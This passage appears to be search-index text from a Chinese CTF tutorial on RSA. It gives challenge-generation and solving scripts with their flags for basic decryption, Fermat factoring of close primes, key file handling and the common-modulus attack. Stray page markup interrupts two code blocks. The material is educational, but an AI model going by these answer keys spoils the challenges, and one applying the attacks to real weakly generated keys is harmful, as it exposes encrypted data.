\u5206\u949f</p>"},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P04.RSA%E5%9F%BA%E7%A1%80%E9%A2%98%E7%9B%AE%E5%8F%8A%E8%84%9A%E6%9C%AC/#p04rsa","title":"P04.RSA\u57fa\u7840\u9898\u76ee\u53ca\u811a\u672c","text":""},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P04.RSA%E5%9F%BA%E7%A1%80%E9%A2%98%E7%9B%AE%E5%8F%8A%E8%84%9A%E6%9C%AC/#flag","title":"\u968f\u673a\u751f\u6210flag","text":"<pre><code>import random\nimport hashlib\nimport string\n\n#\u5b57\u7b26\u4e32\u5217\u8868\na=string.printable\n#\u968f\u673a\u751f\u6210flag\nfor i in range(10):\n    flag = \"\"\n    for i in range(10):\n        flag += a[random.randint(0, 99)]\n    flag = hashlib.md5(flag.encode()).hexdigest()\n    print(\"flag{\" + flag + \"}\")\n\n\nfrom uuid import uuid1\nflag=\"flag{\"+str(uuid1())+\"}\"\nprint(flag)\n</code></pre>"},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P04.RSA%E5%9F%BA%E7%A1%80%E9%A2%98%E7%9B%AE%E5%8F%8A%E8%84%9A%E6%9C%AC/#_1","title":"\u51fa\u9898\u811a\u672c","text":"<pre><code>import libnum\n\n#\u751f\u6210\u968f\u673a\u7d20\u6570\np=libnum.generate_prime(1024)\nq=libnum.generate_prime(1024)\ne=65537\nm=\"flag{20d6e2da95dcc1fa5f5432a436c4be18}\"\n#\u5b57\u7b26\u4e32\u8f6c\u6570\u5b57\nm=libnum.s2n(m)\nn=p*q\nphi_n=(p-1)*(q-1)\n#\u6c42\u9006\u5143\nd=libnum.invmod(e,phi_n)\nc=pow(m,e,n)\n\n\nprint(\"p=\",p)\nprint(\"q=\",q)\nprint (\"n=\",n)\nprint(\"d=\",d)\nprint (\"e=\",e)\nprint (\"c=\",c)\n</code></pre>"},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P04.RSA%E5%9F%BA%E7%A1%80%E9%A2%98%E7%9B%AE%E5%8F%8A%E8%84%9A%E6%9C%AC/#ndecm","title":"\u5df2\u77e5n,d,e,c\u6c42m","text":"<pre><code>import libnum\n\nn= 14685532699024100754723222996385121368294636639693750794149020559314539676501066491415844320990799035552463714403031072164829458702780715523923962246149328887690893262271480633736651143634392056066729487305166335857950659680699210683976952113003674104898343893168719508462975991580551696824510044412974267585312807460664570245139015568859112921920860421973308538800641652781742897528769692264955229878206911313791989518088100099218315995549914435278654377368771668058107642713121127495780090852489015591581414806590111818355121157794129813430710822697558144598815860067978324469091074823400715400666808772858128261149\nd= 10655677501818714057545408290692306276248758047017058020876274084213258239416744966450976471246402284779991562186357882946337721435118045765127426899173581894141706933500094886492805160951008521020815528782559085235105783294876017603112074153984218299742602608478449101819428678878037976091306073545785820932796422483686522431260926680891531210950251782422010888047909274618007401655588566411972291526501884077240225819170340160706732901152519829956055255218835518533347875405883278225018714890042991619568316304958478955576005445279807142753050999269866987221510643119355301877102904394259290548609330522059178100989\ne= 65537\nc= 7937297427288435728721973474925856865675225171317301007619581716746999628275946964127516634203401830643076435690247635478297903236185011960902817030042080567027165802992734580344202744697251074454156026031417427325660809453340428989949816426637434868049018580855865080715251672252410696685286047485204432648545886024276695749435709592994477514818763551176789963387889424072650811645828675090859926233585219662579177051353763021116106877502871331756544361402971459889233069752657661921397258845893293005099736406362733668960163109452223071514272504206470939914043855546880424121530822318600645513435826636440478681928\n\nm=pow(c, d, n)\nprint(libnum.n2s(m).decode())\n</code></pre>"},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P04.RSA%E5%9F%BA%E7%A1%80%E9%A2%98%E7%9B%AE%E5%8F%8A%E8%84%9A%E6%9C%AC/#pqecm","title":"\u5df2\u77e5p,q,e,c\u6c42m","text":"<pre><code>import libnum\n\np= 178974110759313878895493455207516672882434662571655460770401953730906926302476821805659378622536968418528094957044346203494793341636459433763427491907849563922785749794854266865548657682445692416895365631610849027415100889893466490767087266542637440212533807985124840688092762928583845838066174446047886496977\nq= 93610871651220602641323046206103959524660743045950590135111801621145944725719667412027010040112514078098465817329474817485502356054795293086881519931215167856745860801666777619204160653243683622930567962804914581845602027547589056026105213437044768786486688576038889017989891165091320977401144724582916902269\ne= 65537\nc= 10505609204533893330224001468185225454647695615253006709365840521320011117703729471412769493857753605106376689659952882885215696765275778768339621441610719177208351696489476567331875339672513868473669863672226315682278831184868041476134806131989809014422520472566202048041013413698358733781909446846787304422628166599338803127610040714545537436536348608012176828441837378861024372912755344397449657260043057239911064546424582314518819235470388313710641962070846850292694572345451390561142917224092435026246696084949470913298543523893386679712766629009873176804118782436042080621119334193337953451160118095182279971122\n\nn=p*q\nphi_n=(p-1)*(q-1)\n\n#\u6c42\u9006\u5143\nd=libnum.invmod(e,phi_n)\n\nm=pow(c,d,n)\nprint(m)\n#\u6570\u5b57\u8f6c\u5b57\u8282\uff0c\u8f6c\u5b57\u7b26\u4e32\nprint(libnum.n2s(int(m)).decode())\n</code></pre>"},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P05.%E5%9F%BA%E4%BA%8EN%E5%88%86%E8%A7%A3%E7%9A%84%E9%A2%98%E7%9B%AE/","title":"P05.\u57fa\u4e8eN\u5206\u89e3\u7684\u9898\u76ee","text":""},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P05.%E5%9F%BA%E4%BA%8EN%E5%88%86%E8%A7%A3%E7%9A%84%E9%A2%98%E7%9B%AE/#p05-nrsa","title":"P05. \u57fa\u4e8eN\u5206\u89e3\u7684RSA\u9898\u76ee","text":"<ul> <li> \u5bf9N\u8fdb\u884c\u5206\u89e3\uff08\u53ea\u8981\u77e5\u9053p\u548cq,\u5c31\u80fd\u89e3\u51fa\u4efb\u4f55rsa\uff09</li> <li> N\u5728\u6709\u4e00\u822c\u60c5\u51b5\u4e0b\u4e0d\u53ef\u5206\u89e3\u7684\uff0c\u5982\u679cp\u548cq\u592a\u63a5\u8fd1\uff0c\u6216\u76f8\u5dee\u8fc7\u5927\uff0c\u6216pq\u5f88\u5c0f\u7b49\u60c5\u51b5</li> </ul>"},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P05.%E5%9F%BA%E4%BA%8EN%E5%88%86%E8%A7%A3%E7%9A%84%E9%A2%98%E7%9B%AE/#1","title":"1.\u5728\u7ebf\u67e5\u8be2\u5206\u89e3\u7f51\u7ad9","text":"<pre><code>http://www.factordb.com/index.php\n</code></pre>"},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P05.%E5%9F%BA%E4%BA%8EN%E5%88%86%E8%A7%A3%E7%9A%84%E9%A2%98%E7%9B%AE/#2yafu","title":"2.\u4f7f\u7528yafu\u5de5\u5177\u5206\u89e3","text":"<p>\u4e0b\u8f7d\u5730\u5740\uff1ahttps://sourceforge.net/projects/yafu/</p> <pre><code>#\u4ee5\u5206\u89e349\u4e3a\u4f8b\nyafu-x64.exe factor(49)\n\n#\u5bfc\u5165\u6587\u4ef6\u8fdb\u884c\u5206\u89e3\uff0c\u4e3b\u8981\u6ce8\u610f\u6587\u672c\u7ed3\u5c3e\u8981\u6362\u884c\uff01\uff01\uff01\u4e0d\u7136\u8981\u62a5\u9519\nyafu-x64.exe \"factor(@)\" -batchfile 1.txt\n</code></pre>"},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P05.%E5%9F%BA%E4%BA%8EN%E5%88%86%E8%A7%A3%E7%9A%84%E9%A2%98%E7%9B%AE/#3","title":"3.\u4f7f\u7528\u8d39\u9a6c\u5206\u89e3","text":"<p>\u7f51\u4e0a\u627e\u7684\u811a\u672c\uff0cp\u548cq\u592a\u63a5\u8fd1 <pre><code>def isqrt(n):\n  x = n\n  y = (x + n // x) // 2\n  while y &lt; x:\n    x = y\n    y = (x + n // x) // 2\n  return x\n\ndef fermat(n, verbose=True):\n    a = isqrt(n) # int(ceil(n**0.5))\n    b2 = a*a - n\n    b = isqrt(n) # int(b2**0.5)\n    count = 0\n    while b*b != b2:\n        # if verbose:\n&lt;div markdown=\"1\" style=\"margin-top: -30px; font-size: 0.75em; opacity: 0.7;\"&gt;\n:material-circle-edit-outline: \u7ea6 177 \u4e2a\u5b57 :fontawesome-solid-code: 146 \u884c\u4ee3\u7801 :material-clock-time-two-outline: \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 2 \u5206\u949f\n&lt;/div&gt;\n        #     print('Trying: a=%s b2=%s b=%s' % (a, b2, b))\n        a = a + 1\n        b2 = a*a - n\n        b = isqrt(b2) # int(b2**0.5)\n        count += 1\n    p=a+b\n    q=a-b\n    assert n == p * q\n    # print('a=',a)\n    # print('b=',b)\n    # print('p=',p)\n    # print('q=',q)\n    # print('pq=',p*q)\n    return p, q\nfermat(n)\n</code></pre> \u811a\u672c2 <pre><code>def fermat_factorization(n):\n    factor_list = []\n    gmpy2.get_context().precision = 2048\n    sqrt_n = int(gmpy2.sqrt(n))\n    c = sqrt_n\n    while True:\n        c += 1\n        d_square = c**2 - n\n        if gmpy2.is_square(d_square):\n            d_square = gmpy2.mpz(d_square)\n            gmpy2.get_context().precision = 2048\n            d = int(gmpy2.sqrt(d_square))\n            factor_list.append([c+d,c-d])\n        if len(factor_list)==1:\n            break\n    return factor_list\n</code></pre></p>"},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P05.%E5%9F%BA%E4%BA%8EN%E5%88%86%E8%A7%A3%E7%9A%84%E9%A2%98%E7%9B%AE/#4","title":"4.\u5206\u89e3\u51fa\u6765\u540e\uff0c\u7528\u811a\u672c\u89e3\u5bc6\u5373\u53ef","text":"<pre><code>import gmpy2\nimport libnum\n\np= \nq= \ne= \nc= \n\nn=p*q\nphi_n=(p-1)*(q-1)\n\n#\u6c42\u9006\u5143\n#d=libnum.invmod(e,phi_n)\nd=gmpy2.invert(e,phi_n)\n\nm=pow(c,d,n)\nprint(m)\nprint(libnum.n2s(int(m)).decode())\n</code></pre>"},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P05.%E5%9F%BA%E4%BA%8EN%E5%88%86%E8%A7%A3%E7%9A%84%E9%A2%98%E7%9B%AE/#_1","title":"\u51fa\u9898\u811a\u672c","text":""},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P05.%E5%9F%BA%E4%BA%8EN%E5%88%86%E8%A7%A3%E7%9A%84%E9%A2%98%E7%9B%AE/#flag","title":"\u968f\u673a\u751f\u6210flag","text":"<pre><code>import random\nimport hashlib\nimport string\n\n#\u5b57\u7b26\u4e32\u5217\u8868\na=string.printable\n#\u968f\u673a\u751f\u6210flag\nfor i in range(10):\n    flag = \"\"\n    for i in range(10):\n        flag += a[random.randint(0, 99)]\n    flag = hashlib.md5(flag.encode()).hexdigest()\n    print(\"flag{\" + flag + \"}\")\n\nfrom uuid import uuid1\nflag=\"flag{\"+str(uuid1())+\"}\"\nprint(flag)\n</code></pre>"},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P05.%E5%9F%BA%E4%BA%8EN%E5%88%86%E8%A7%A3%E7%9A%84%E9%A2%98%E7%9B%AE/#pq","title":"p,q\u63a5\u8fd1\uff0c\u5f88\u5feb\u5c31\u80fd\u5206\u89e3","text":"<pre><code>import libnum\nimport gmpy2\n\np=libnum.generate_prime(1024)\n#\u4e0b\u4e00\u4e2a\u7d20\u6570\nq=gmpy2.next_prime(p)\nprint(p)\nprint(q)\nprint(gmpy2.is_prime(q))\ne=65537\nm=\"flag{20d6e2da95dcc1fa5f5432a436c4be18}\"\nm=libnum.s2n(m)\nn=p*q\nphi_n=(p-1)*(q-1)\nd=libnum.invmod(e,phi_n)\nc=pow(m,e,n)\n\nprint(\"n=\",n)\nprint (\"e=\",e)\nprint (\"c=\",c)\n</code></pre>"},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P05.%E5%9F%BA%E4%BA%8EN%E5%88%86%E8%A7%A3%E7%9A%84%E9%A2%98%E7%9B%AE/#_2","title":"\u89e3\u9898\u811a\u672c","text":"<pre><code>import  gmpy2\nimport libnum\n\ndef isqrt(n):\n  x = n\n  y = (x + n // x) // 2\n  while y &lt; x:\n    x = y\n    y = (x + n // x) // 2\n  return x\n\ndef fermat(n, verbose=True):\n    a = isqrt(n) # int(ceil(n**0.5))\n    b2 = a*a - n\n    b = isqrt(n) # int(b2**0.5)\n    count = 0\n    while b*b != b2:\n        # if verbose:\n        #     print('Trying: a=%s b2=%s b=%s' % (a, b2, b))\n        a = a + 1\n        b2 = a*a - n\n        b = isqrt(b2) # int(b2**0.5)\n        count += 1\n    p=a+b\n    q=a-b\n    assert n == p * q\n    # print('a=',a)\n    # print('b=',b)\n    print('p=',p)\n    print('q=',q)\n    # print('pq=',p*q)\n    return p, q\nn= 11236396438945464079176717143196471087880430124798640194523124584883161483744355761881720924798661332027501424643154414538029585287580122761405974427818841257794157497994556608202723391478027760181705924317533420305444809223444128034654367210331137068958693840582892819495487826045956577156074156668942232139402108462349340352898572481115406698318121299787982873916502591396884489682255184448165523604671743400422220149772905676655777228607948091675612455989601008858361759327370403306760674195506394280387024357322586732298060169962426894360775981877169895632927906390632063530920611197753716095903307467004289983267\ne= 65537\nc= 4260482466101011731957430920901406417434306478040387371588613512063428441001754753741853444857207349755032658064826592770143368278573527632514794087007140974732031358793249329430363014561312271335226315065519570861993052432656879088776144909638480994662696119431870831156129142403063675855781198930583825083362703887688501680905266707624440432914989795886392952354713859444836529227033324455920455610359249535012999943891644938239837207994673190694512955995798836266797112432609992164908679997257920566918693544746179908166741635316261624634351348613130319346356388546672516037747806222134853885202448682842353199133\npq=fermat(n)\np=pq[0]\nq=pq[1]\nphi_n=(p-1)*(q-1)\n#\u6c42\u9006\u5143\n#d=libnum.invmod(e,phi_n)\nd=gmpy2.invert(e,phi_n)\nm=pow(c,d,n)\nprint(m)\nprint(libnum.n2s(int(m)).decode())\n</code></pre>"},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P06.RSA%E5%AF%86%E9%92%A5%E7%94%9F%E6%88%90%E4%B8%8E%E8%AF%BB%E5%8F%96/","title":"P06.RSA\u5bc6\u94a5\u751f\u6210\u4e0e\u8bfb\u53d6","text":""},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P06.RSA%E5%AF%86%E9%92%A5%E7%94%9F%E6%88%90%E4%B8%8E%E8%AF%BB%E5%8F%96/#p06rsa","title":"P06.RSA\u5bc6\u94a5\u751f\u6210\u4e0e\u8bfb\u53d6","text":""},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P06.RSA%E5%AF%86%E9%92%A5%E7%94%9F%E6%88%90%E4%B8%8E%E8%AF%BB%E5%8F%96/#1pycryptodome","title":"1.pycryptodome\u6a21\u5757","text":""},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P06.RSA%E5%AF%86%E9%92%A5%E7%94%9F%E6%88%90%E4%B8%8E%E8%AF%BB%E5%8F%96/#_1","title":"\u516c\u94a5\u751f\u6210","text":"<pre><code>from Crypto.PublicKey import RSA\n\np= 787228223375328491232514653709\nq= 814212346998672554509751911073\nn= 640970939378021470187479083920100737340912672709639557619757\nd= 590103645243332826117029128695341159496883001869370080307201\ne= 65537\n\n\nrsa_components = (n, e)\nkeypair = RSA.construct(rsa_components)\nwith open('pubckey.pem', 'wb') as f :\n    f.write(keypair.exportKey())\n</code></pre>"},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P06.RSA%E5%AF%86%E9%92%A5%E7%94%9F%E6%88%90%E4%B8%8E%E8%AF%BB%E5%8F%96/#_2","title":"\u79c1\u94a5\u751f\u6210","text":"<pre><code>from Crypto.PublicKey import RSA\n\np= 787228223375328491232514653709\nq= 814212346998672554509751911073\nn= 640970939378021470187479083920100737340912672709639557619757\nd= 590103645243332826117029128695341159496883001869370080307201\ne= 65537\n\n\nrsa_components = (n,e,d,p,q)\nkeypair = RSA.construct(rsa_components)\nwith open('private1.pem', 'wb') as f :\n    f.write(keypair.exportKey())\n</code></pre>"},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P06.RSA%E5%AF%86%E9%92%A5%E7%94%9F%E6%88%90%E4%B8%8E%E8%AF%BB%E5%8F%96/#_3","title":"\u516c\u94a5\u8bfb\u53d6","text":"<pre><code>from Crypto.PublicKey import RSA\nwith open(\"pubckey.pem\",\"rb\") as f:\n    key = RSA.import_key(f.read())\n    print('n = %d' % key.n)\n    print('e = %d' % key.e)\n</code></pre>"},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P06.RSA%E5%AF%86%E9%92%A5%E7%94%9F%E6%88%90%E4%B8%8E%E8%AF%BB%E5%8F%96/#_4","title":"\u79c1\u94a5\u8bfb\u53d6","text":"<pre><code>from Crypto.PublicKey import RSA\nwith open(\"private1.pem\",\"rb\") as f:\n    key = RSA.import_key(f.read())\n    print('n = %d' % key.n)\n    print('e = %d' % key.e)\n    print('d = %d' % key.d)\n    print('p = %d' % key.p)\n    print('q = %d' % key.q)\n</code></pre>"},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P06.RSA%E5%AF%86%E9%92%A5%E7%94%9F%E6%88%90%E4%B8%8E%E8%AF%BB%E5%8F%96/#2rsa","title":"2.rsa\u6a21\u5757 \uff08\u4e0d\u63a8\u8350\uff09","text":""},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P06.RSA%E5%AF%86%E9%92%A5%E7%94%9F%E6%88%90%E4%B8%8E%E8%AF%BB%E5%8F%96/#_5","title":"\u516c\u94a5\u751f\u6210","text":"<pre><code>import rsa\n\np= 787228223375328491232514653709\nq= 814212346998672554509751911073\nn= 640970939378021470187479083920100737340912672709639557619757\nd= 590103645243332826117029128695341159496883001869370080307201\ne= 65537\n\npubkey = rsa.PublicKey(n , e )\nprint(pubkey)\npub=rsa.PublicKey.save_pkcs1(pubkey)\nwith open(\"pub.pem\",\"wb\") as f:\n    f.write(pub)\n</code></pre>"},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P06.RSA%E5%AF%86%E9%92%A5%E7%94%9F%E6%88%90%E4%B8%8E%E8%AF%BB%E5%8F%96/#_6","title":"\u79c1\u94a5\u751f\u6210","text":"<pre><code>import rsa\n\np= 787228223375328491232514653709\nq= 814212346998672554509751911073\nn= 640970939378021470187479083920100737340912672709639557619757\nd= 590103645243332826117029128695341159496883001869370080307201\ne= 65537\nprikey = rsa.PrivateKey(n , e , d , p , q)\nprint(prikey)\npri=rsa.PrivateKey.save_pkcs1(prikey)\nwith open(\"pri.pem\",\"wb\") as f:\n    f.write(pri)\n</code></pre>"},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P06.RSA%E5%AF%86%E9%92%A5%E7%94%9F%E6%88%90%E4%B8%8E%E8%AF%BB%E5%8F%96/#_7","title":"\u516c\u94a5\u8bfb\u53d6","text":"<pre><code>import rsa\nwith open('2.pem','rb') as f:\n    keydata= f.read()\npubckey = rsa.PublicKey.load_pkcs1(keydata)\n#pubckey = rsa.PublicKey.load_pkcs1_openssl_pem(keydata)\nprint(pubckey.n)\nprint(pubckey.e)\n</code></pre>"},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P06.RSA%E5%AF%86%E9%92%A5%E7%94%9F%E6%88%90%E4%B8%8E%E8%AF%BB%E5%8F%96/#_8","title":"\u79c1\u94a5\u8bfb\u53d6","text":"<pre><code>import rsa\nwith open('1.pem','rb') as f:\n    keydata= f.read()\npubckey = rsa.PrivateKey.load_pkcs1(keydata)\nprint(pubckey.n)\nprint(pubckey.e)\nprint(pubckey.d)\nprint(pubckey.q)\nprint(pubckey.p)\n</code></pre>"},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P06.RSA%E5%AF%86%E9%92%A5%E7%94%9F%E6%88%90%E4%B8%8E%E8%AF%BB%E5%8F%96/#_9","title":"\u51fa\u9898\u811a\u672c","text":""},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P06.RSA%E5%AF%86%E9%92%A5%E7%94%9F%E6%88%90%E4%B8%8E%E8%AF%BB%E5%8F%96/#flag","title":"\u968f\u673a\u751f\u6210flag","text":"<pre><code>import random\nimport hashlib\nimport string\n\n#\u5b57\u7b26\u4e32\u5217\u8868\na=string.printable\n#\u968f\u673a\u751f\u6210flag\nfor i in range(10):\n    flag = \"\"\n    for i in range(10):\n        flag += a[random.randint(0, 99)]\n    flag = hashlib.md5(flag.encode()).hexdigest()\n    print(\"flag{\" + flag + \"}\")\n</code></pre>"},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P06.RSA%E5%AF%86%E9%92%A5%E7%94%9F%E6%88%90%E4%B8%8E%E8%AF%BB%E5%8F%96/#n","title":"\u57fa\u4e8eN\u5206\u89e3\u7684\u9898\u76ee","text":"<pre><code>import libnum\nimport gmpy2\nfrom Crypto.PublicKey import RSA\n\np=libnum.generate_prime(1024)\n#\u4e0b\u4e00\u4e2a\u7d20\u6570\nq=int(gmpy2.next_prime(p))\ne=65537\nm=\"flag{a272722c1db834353ea3ce1d9c71feca}\"\nm=libnum.s2n(m)\nn=p*q\nc=pow(m,e,n)\nflag_c=libnum.n2s(c)\nrsa_components = (n, e)\nkeypair = RSA.construct(rsa_components)\nwith open('pubckey1.pem', 'wb') as f :\n    f.write(keypair.exportKey())\nwith open(\"flag.txt\",\"wb\") as f:\n    f.write(flag_c)\n</code></pre>"},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P06.RSA%E5%AF%86%E9%92%A5%E7%94%9F%E6%88%90%E4%B8%8E%E8%AF%BB%E5%8F%96/#_10","title":"\u89e3\u9898\u811a\u672c","text":"<pre><code>import libnum\nimport gmpy2\nfrom Crypto.PublicKey import RSA\n\n\ndef isqrt(n):\n  x = n\n  y = (x + n // x) // 2\n  while y &lt; x:\n    x = y\n    y = (x + n // x) // 2\n  return x\n\ndef fermat(n, verbose=True):\n    a = isqrt(n) # int(ceil(n**0.5))\n    b2 = a*a - n\n    b = isqrt(n) # int(b2**0.5)\n    count = 0\n    while b*b != b2:\n        # if verbose:\n&lt;div markdown=\"1\" style=\"margin-top: -30px; font-size: 0.75em; opacity: 0.7;\"&gt;\n:material-circle-edit-outline: \u7ea6 82 \u4e2a\u5b57 :fontawesome-solid-code: 208 \u884c\u4ee3\u7801 :material-clock-time-two-outline: \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 3 \u5206\u949f\n&lt;/div&gt;\n        #     print('Trying: a=%s b2=%s b=%s' % (a, b2, b))\n        a = a + 1\n        b2 = a*a - n\n        b = isqrt(b2) # int(b2**0.5)\n        count += 1\n    p=a+b\n    q=a-b\n    assert n == p * q\n    # print('a=',a)\n    # print('b=',b)\n    # print('p=',p)\n    # print('q=',q)\n    # print('pq=',p*q)\n    return p, q\n\n\nwith open(\"pubckey1.pem\",\"rb\") as f:\n    key = RSA.import_key(f.read())\n    n=key.n\n    e=key.e\n\nwith open(\"flag.txt\",\"rb\") as f:\n    c=f.read()\n    c=libnum.s2n(c)\n\n#\u8d39\u9a6c\u5206\u89e3,\nn1=fermat(n)\np=n1[0]\nq=n1[1]\nphi_n=(p-1)*(q-1)\n#\u6c42\u9006\u5143\nd=libnum.invmod(e,phi_n)\nm=pow(c,d,n)\nprint(m)\nprint(libnum.n2s(int(m)).decode())\n</code></pre>"},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P06.RSA%E5%AF%86%E9%92%A5%E7%94%9F%E6%88%90%E4%B8%8E%E8%AF%BB%E5%8F%96/#_11","title":"\u81ea\u52a8\u751f\u6210\u5bc6\u94a5\u53ca\u52a0\u89e3\u5bc6\u8fc7\u7a0b","text":"<pre><code>from Crypto.Cipher import PKCS1_v1_5\nfrom Crypto import Random\nfrom Crypto.PublicKey import RSA\nfrom Crypto.Cipher import PKCS1_OAEP\n\n\nrandom_generator = Random.new().read\nrsa = RSA.generate(2048, random_generator)\n# \u751f\u6210\u79c1\u94a5\nprivate_key = rsa.exportKey()\n# print(private_key.decode('utf-8'))\nwith open('rsa_private_key.pem', 'wb')as f:\n    f.write(private_key)\n# \u751f\u6210\u516c\u94a5\npublic_key = rsa.publickey().exportKey()\n# print(public_key.decode('utf-8'))\nwith open('rsa_public_key.pem', 'wb')as f:\n    f.write(public_key)\n\n\n#\u6d4b\u8bd5\u7528\u5bc6\u94a5\u52a0\u5bc6\npublic_key = RSA.importKey(public_key)\nmsg='flag'\npk = PKCS1_v1_5.new(public_key)\nencrypt_text = pk.encrypt(msg.encode())\nprint(encrypt_text)\n\n#\u6d4b\u8bd5\u5bc6\u94a5\u89e3\u5bc6\nprivate_key = RSA.importKey(private_key)\npk = PKCS1_v1_5.new(private_key)\nmsg = pk.decrypt(encrypt_text,0)\nprint(msg)\n\n\n#\u4e24\u79cd\u6807\u51c6\nrsa_components = (n, e, int(d), p, q)\narsa = RSA.construct(rsa_components)\nrsakey = RSA.importKey(arsa.exportKey())\nrsakey = PKCS1_OAEP.new(rsakey)\ndecrypted = rsakey.decrypt(c)\nprint(decrypted)\n</code></pre>"},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P07.%E5%85%B1%E6%A8%A1%E6%94%BB%E5%87%BB/","title":"P07.\u5171\u6a21\u653b\u51fb","text":""},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P07.%E5%85%B1%E6%A8%A1%E6%94%BB%E5%87%BB/#p07","title":"P07.\u5171\u6a21\u653b\u51fb","text":"<p>\u5171\u6a21\u653b\u51fb\uff0c\u4e5f\u79f0\u540c\u6a21\u653b\u51fb\u3002</p> <p>\u540c\u6a21\u653b\u51fb\u5229\u7528\u7684\u5927\u524d\u63d0\u5c31\u662f\uff0cRSA\u4f53\u7cfb\u5728\u751f\u6210\u5bc6\u94a5\u7684\u8fc7\u7a0b\u4e2d\u4f7f\u7528\u4e86\u76f8\u540c\u7684\u6a21\u6570n\u3002</p> <p>\u5728CTF\u9898\u76ee\u4e2d\uff0c\u5c31\u662f \u540c\u4e00\u660e\u6587\uff0c\u540c\u4e00n,\u4e0d\u540ce\uff0c\u8fdb\u884c\u52a0\u5bc6\u3002</p> <p>m\uff0cn\u76f8\u540c\uff1be\uff0cc\u4e0d\u540c\uff0c\u4e14e1 \u548c e2\u4e92\u8d28</p>"},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P07.%E5%85%B1%E6%A8%A1%E6%94%BB%E5%87%BB/#_1","title":"\u51fa\u9898\u811a\u672c","text":""},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P07.%E5%85%B1%E6%A8%A1%E6%94%BB%E5%87%BB/#flag","title":"\u968f\u673a\u751f\u6210flag","text":"<pre><code>import random\nimport hashlib\nimport string\n\n#\u5b57\u7b26\u4e32\u5217\u8868\na=string.printable\n#\u968f\u673a\u751f\u6210flag\nfor i in range(10):\n    flag = \"\"\n    for i in range(10):\n        flag += a[random.randint(0, 99)]\n    flag = hashlib.md5(flag.encode()).hexdigest()\n    print(\"flag{\" + flag + \"}\")\n</code></pre>"},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P07.%E5%85%B1%E6%A8%A1%E6%94%BB%E5%87%BB/#1","title":"\u9898\u76ee1","text":"<pre><code>#coding:utf-8\nimport libnum\nimport gmpy2\n#\u751f\u6210\u7d20\u6570\np=libnum.generate_prime(1024)\nq=libnum.generate_prime(1024)\ne1=2333\ne2=23333\nm=\"flag{6ed4c74e022cb18c8039e96de93aa9ce}\"\nm=libnum.s2n(m)\nn=p*q\n#pow(x, y[, z])\n#\u51fd\u6570\u662f\u8ba1\u7b97 x \u7684 y \u6b21\u65b9\uff0c\u5982\u679c z \u5728\u5b58\u5728\uff0c\u5219\u518d\u5bf9\u7ed3\u679c\u8fdb\u884c\u53d6\u6a21\nc1=pow(m,e1,n)\nc2=pow(m,e2,n)\nprint(\"n1:\",n)\nprint(\"e1:\",e1)\nprint(\"c1:\",c1)\nprint(\"n2:\",n)\nprint(\"e2:\",e2)\nprint(\"c2:\",c2)\n</code></pre>"},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P07.%E5%85%B1%E6%A8%A1%E6%94%BB%E5%87%BB/#1_1","title":"\u9898\u76ee1\u89e3\u5bc6","text":"<pre><code>#coding:utf-8\nimport gmpy2\nimport libnum\n\nn=10509135007927020910961570498020654777820601579825669027410027026173076573380693204454238919762243178647774720169342528691085983225219960236799370268896666867164869238677749575679762611540687182614629847614275763451130215062534086871119259415866636857654106010518677919485438729877453549868724935457349692430637646827845074169704597756894678350214029352130966923159025112991395150214022844221949818486992653054085916326074567355928744181958934887632087019273037034539054980148783728604561167417571308543568511557184742388987903995431328908643666134429145944816840592528868078022503367301892068877343146684216682292031\ne1=2333\nc1=7817747253100075445080016685151086112268236401548478039383697586624131257005712900744875480257235019856465005133060251952853265167801711501859975585492982445693865641552507292652891995513965716569403068769379922648392091598433743576490830481993190692094310002540291082497060442504191087716491306341060343322555758506922102525722142895936303098845293736052077805416603114326241892440936798612985329887620848022507113494020806335634837064221561034485913416272720657761870572787579710754920585427628542146537468299211892356070884683021760416483687996756045071803827949139730328011630778732391114457251096093112357217218\nn2=1050913500792702091096157049802065477782060157982566902741002702617307657338069320445423891976224317864777472016934252869108598322521996023679937026889666686716486923867774957567976261154068718261462984761427576345113021506253408687111925941586663685765410601051867791948543872987745354986872493545734969243063764682784507416970459775689467835021402935213096692315902511299139515021